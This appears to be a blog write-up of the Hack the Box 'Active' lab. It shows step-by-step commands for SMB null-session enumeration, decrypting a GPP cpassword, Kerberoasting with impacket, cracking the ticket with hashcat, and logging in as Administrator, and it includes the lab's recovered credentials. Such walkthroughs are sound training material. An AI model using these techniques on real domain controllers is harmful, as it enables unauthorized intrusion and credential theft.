---
layout: post
title: Hack the Box - Active
tags: [hackthebox]
---
![active-badge]({{site.url}}/assets/images/active/active-badge.jpg){:class="img-responsive"}
<!--more-->

- nmap uncovered what appeared to be a domain controller based upon the open ports

{% highlight bash %}
nmap -vv -sC -sV -oA initial 10.10.10.100
{% endhighlight %}
![nmap-scan]({{site.url}}/assets/images/active/active-nmap.jpg){:class="img-responsive"}

- tested and confirmed that SMB null session could be established using:

{% highlight bash %}
smbclient //10.10.10.100/ -U '' -W ACTIVE -p ''
{% endhighlight %}

- found what appeared to be GPO preference files with encrypted password in a file groups.xml

{% highlight bash %}
userName="active.htb\SVC_TGS"
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
{% endhighlight %}

- found [https://github.com/reider-roque/pentest-tools/tree/master/password-cracking/gpprefdecrypt](https://github.com/reider-roque/pentest-tools/tree/master/password-cracking/gpprefdecrypt), and used the python script to crack the passowrd. Usage as follows:

{% highlight bash %}
python gpprefdecrypt.py edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
{% endhighlight %}

- got the password: **GPPstillStandingStrong2k18**

- researched kerberos based upon the username "TGS" and the fact that it is a domain controller.

- found [https://malicious.link/post/2016/kerberoast-pt2/](https://malicious.link/post/2016/kerberoast-pt2/) and more specifically the reference to impacket at the bottom of the page

- cloned impacket from [here](https://github.com/SecureAuthCorp/impacket)

- ran the following command using the above credentials, and got the output below

{% highlight bash %}
./GetUserSPNs.py -request active.htb/SVC_TGS
{% endhighlight %}

![active-impacket]({{site.url}}/assets/images/active/active-impacket.jpg){:class="img-responsive"}

- checked the [Hashcat example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) for $krb5tgs$23$ format and found that it matches mode 13100

- added the entire $krb5tgs$23$ string above to a file called active.krb, and used hashcat along with the rockyou.txt wordlist to get the password

{% highlight bash %}
./hashcat -m 13100 active.krb /pentest/wordlists/rockyou.txt
{% endhighlight %}

- after only a few seconds I had the password: **Ticketmaster1968**

- ran the following command with the new crednetials to connect to the users share

{% highlight bash %}
smbclient //10.10.10.100/Users -U Administrator -W ACTIVE -p Ticketmaster1968
{% endhighlight %}

- browsed to Administrator/Desktop and ran the following to get the flag

{% highlight bash %}
get root.txt
{% endhighlight %}

- to get a shell as Administrator you can simply use the psexec.py impacket script with the same credentials
